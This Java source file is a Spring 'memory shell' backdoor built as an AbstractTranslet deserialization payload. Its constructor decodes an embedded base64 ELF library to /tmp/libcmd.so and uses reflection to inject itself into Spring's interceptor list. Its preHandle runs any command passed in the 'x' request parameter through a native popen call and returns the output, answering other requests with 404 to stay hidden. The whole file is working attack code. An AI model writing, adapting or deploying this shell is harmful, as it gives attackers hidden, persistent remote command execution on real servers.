import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Base64;

public class MemInterceptors extends AbstractTranslet implements HandlerInterceptor {
    public native String doExec(String cmd);
    public MemInterceptors() {
        try{
            String str = "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OBAgAAAAAAAHAAAABAAAAAAAAAAAAAAAQBAgAAAAAAAHAAAABQAAAAAAAAAAAAAASBAgAAAAAAAHAAAADgAAAAAAAAAAAAAAUBAgAAAAAAAHAAAABgAAAAAAAAAAAAAAWBAgAAAAAAAHAAAACAAAAAAAAAAAAAAAYBAgAAAAAAAHAAAACQAAAAAAAAAAAAAASIPsCEiLBUUIIABIhcB0Av/QSIPECMMA/zVSCCAA/yVUCCAADx9AAP8lUgggAGgAAAAA6eD/////JUoIIABoAQAAAOnQ/////yVCCCAAaAIAAADpwP////8lOgggAGgDAAAA6bD/////JTIIIABoBAAAAOmg/////yUqCCAAaAUAAADpkP////8lIgggAGgGAAAA6YD/////JRoIIABoBwAAAOlw/////yUSCCAAaAgAAADpYP////8lCgggAGgJAAAA6VD/////JZIHIABmkAAAAAAAAAAASI09+QcgAFVIjQXxByAASDn4SInldBlIiwVSByAASIXAdA1d/+BmLg8fhAAAAAAAXcMPH0AAZi4PH4QAAAAAAEiNPbkHIABIjTWyByAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwURByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD1pByAAAHUvSIM95wYgAABVSInldAxIiz1KByAA6D3////oSP///8YFQQcgAAFdww8fgAAAAADzw2YPH0QAAFVIieVd6Wb///9VSInlSIHsMDAAAEiJvdjP//9IibXQz///ZEiLBCUoAAAASIlF+DHASIuF2M///0iNNUUCAABIicfouP7//0iJhejP//9Ig73oz///AHUHuAAAAADrbEiLhejP//9Iicfogf7//4XAD5TAhMB0QEiLlejP//9IjYXwz///vgABAABIicfoPf7//0iFwA+VwITAdMNIjZXwz///SIuF0M///0iJ1kiJx+ha/v//66hIi4Xoz///SInH6On9//+4AQAAAEiLTfhkSDMMJSgAAAB0Beiw/f//ycNVSInlSIHsQDEAAEiJvdjO//9IibXQzv//SImVyM7//2RIiwQlKAAAAEiJRfgxwEiLjcjO//9Ii4XYzv//ugAAAABIic5Iicfosf3//0iJheDO//9Ix4Xwz///AAAAAEjHhfjP//8AAAAA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AwAKALAHAAAAAAAAAAAAAAAAAAAAAAAAAwALAGAIAAAAAAAAAAAAAAAAAAAAAAAAAwAMAHAIAAAAAAAAAAAAAAAAAAAAAAAAAwANALwLAAAAAAAAAAAAAAAAAAAAAAAAAwAOAMULAAAAAAAAAAAAAAAAAAAAAAAAAwAPAMgLAAAAAAAAAAAAAAAAAAAAAAAAAwAQABAMAAAAAAAAAAAAAAAAAAAAAAAAAwARABAOIAAAAAAAAAAAAAAAAAAAAAAAAwASABgOIAAAAAAAAAAAAAAAAAAAAAAAAwATACAOIAAAAAAAAAAAAAAAAAAAAAAAAwAUAOAPIAAAAAAAAAAAAAAAAAAAAAAAAwAVAAAQIAAAAAAAAAAAAAAAAAAAAAAAAwAWAGgQIAAAAAAAAAAAAAAAAAAAAAAAAwAXAHAQIAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAMAHAIAAAAAAAAAAAAAAAAAAAOAAAAAgAMALAIAAAAAAAAAAAAAAAAAAAhAAAAAgAMAAAJAAAAAAAAAAAAAAAAAAA3AAAAAQAXAHAQIAAAAAAAAQAAAAAAAABGAAAAAQASABgOIAAAAAAAAAAAAAAAAABtAAAAAgAMAEAJAAAAAAAAAAAAAAAAAAB5AAAAAQARABAOIAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACqAAAAAQAQAAgNAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAAC4AAAAAQAWAGgQIAAAAAAAAAAAAAAAAADFAAAAAQATACAOIAAAAAAAAAAAAAAAAADOAAAAAAAPAMgLAAAAAAAAAAAAAAAAAADhAAAAAQAWAHAQIAAAAAAAAAAAAAAAAADtAAAAAQAVAAAQIAAAAAAAAAAAAAAAAAADAQAAIgAMAFQLAAAAAAAAMAAAAAAAAAAhAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAA9AQAAEAAWAHAQIAAAAAAAAAAAAAAAAABEAQAAEgANALwLAAAAAAAAAAAAAAAAAABKAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABmAQAAEgAMAEoJAAAAAAAA2AAAAAAAAAB1AQAAEgAAAAAAAAAAAAAAAAAAAAAAAACJAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACdAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACwAQAAEgAMAEELAAAAAAAAEwAAAAAAAAC7AQAAIgAMAIQLAAAAAAAANQAAAAAAAADnAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAD5AQAAIAAAAAAAAAAAAAAAAAAAAAAAAAAIAgAAEAAXAHgQIAAAAAAAAAAAAAAAAAANAgAAEgAMACIKAAAAAAAAHwEAAAAAAAApAgAAEAAXAHAQIAAAAAAAAAAAAAAAAAA1AgAAEgAAAAAAAAAAAAAAAAAAAAAAAABIAgAAEgAAAAAAAAAAAAAAAAAAAAAAAABcAgAAIAAAAAAAAAAAAAAAAAAAAAAAAAB2AgAAIgAAAAAAAAAAAAAAAAAAAAAAAACSAgAAEgAJAJgHAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc2OTgAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AE1lbUludGVyY2VwdG9ycy5jAF9fRlJBTUVfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX1pON0pOSUVudl8xMk5ld1N0cmluZ1VURkVQS2MAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9lZGF0YQBfZmluaQBfX3N0YWNrX2Noa19mYWlsQEBHTElCQ18yLjQAX1o2ZXhlY21kUEtjUGMAcGNsb3NlQEBHTElCQ18yLjIuNQBtZW1zZXRAQEdMSUJDXzIuMi41AGZnZXRzQEBHTElCQ18yLjIuNQBKTklfT25Mb2FkAF9aTjdKTklFbnZfMTdHZXRTdHJpbmdVVEZDaGFyc0VQOF9qc3RyaW5nUGgAZmVvZkBAR0xJQkNfMi4yLjUAX19nbW9uX3N0YXJ0X18AX2VuZABKYXZhX01lbUludGVyY2VwdG9yc19kb0V4ZWMAX19ic3Nfc3RhcnQAcG9wZW5AQEdMSUJDXzIuMi41AHN0cmNhdEBAR0xJQkNfMi4yLjUAX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2N4YV9maW5hbGl6ZUBAR0xJQkNfMi4yLjUAX2luaXQAAC5zeW10YWIALnN0cnRhYgAuc2hzdHJ0YWIALm5vdGUuZ251LmJ1aWxkLWlkAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAAMgBAAAAAAAAyAEAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAADwAQAAAAAAAPABAAAAAAAATAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAQAIAAAAAAABAAgAAAAAAABACAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAAFAEAAAAAAAAUAQAAAAAAABQAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAD///9vAgAAAAAAAACgBQAAAAAAAKAFAAAAAAAALAAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABVAAAA/v//bwIAAAAAAAAA0AUAAAAAAADQBQAAAAAAADAAAAAAAAAABAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAAAAGAAAAAAAAAAYAAAAAAACoAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAACoBgAAAAAAAKgGAAAAAAAA8AAAAAAAAAADAAAAFQAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAmAcAAAAAAACYBwAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAALAHAAAAAAAAsAcAAAAAAACwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAABgCAAAAAAAAGAIAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACHAAAAAQAAAAYAAAAAAAAAcAgAAAAAAABwCAAAAAAAAEkDAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAjQAAAAEAAAAGAAAAAAAAALwLAAAAAAAAvAsAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJMAAAABAAAAAgAAAAAAAADFCwAAAAAAAMULAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACbAAAAAQAAAAIAAAAAAAAAyAsAAAAAAADICwAAAAAAAEQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAqQAAAAEAAAACAAAAAAAAABAMAAAAAAAAEAwAAAAAAAD8AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALMAAAAOAAAAAwAAAAAAAAAQDiAAAAAAABAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAC/AAAADwAAAAMAAAAAAAAAGA4gAAAAAAAYDgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAywAAAAYAAAADAAAAAAAAACAOIAAAAAAAIA4AAAAAAADAAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAIIAAAABAAAAAwAAAAAAAADgDyAAAAAAAOAPAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADUAAAAAQAAAAMAAAAAAAAAABAgAAAAAAAAEAAAAAAAAGgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3QAAAAEAAAADAAAAAAAAAGgQIAAAAAAAaBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOMAAAAIAAAAAwAAAAAAAABwECAAAAAAAHAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAADoAAAAAQAAADAAAAAAAAAAAAAAAAAAAABwEAAAAAAAACkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAoBAAAAAAAADoBQAAAAAAABoAAAAqAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIgWAAAAAAAAmAIAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAgGQAAAAAAAPEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA";
            File f = new File("/tmp/libcmd.so");
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(Base64.getDecoder().decode(str));
            fos.flush();
            fos.close();

            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);

            Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);

            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)field.get(r);
            Object mem = new MemInterceptors("aaa");
            adaptedInterceptors.add(mem);

        }catch (Exception e){
        }
    }

    private MemInterceptors(String aaa){}

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            String arg0 = request.getParameter("x");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                System.load("/tmp/libcmd.so");
                MemInterceptors jni = new MemInterceptors("aaa");
                String content = jni.doExec(arg0);
                writer.println(content);
                return true;
            } else {
                response.sendError(404);
                return true;
            }
        } catch (Exception var8) {
            response.sendError(404);
            return true;
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}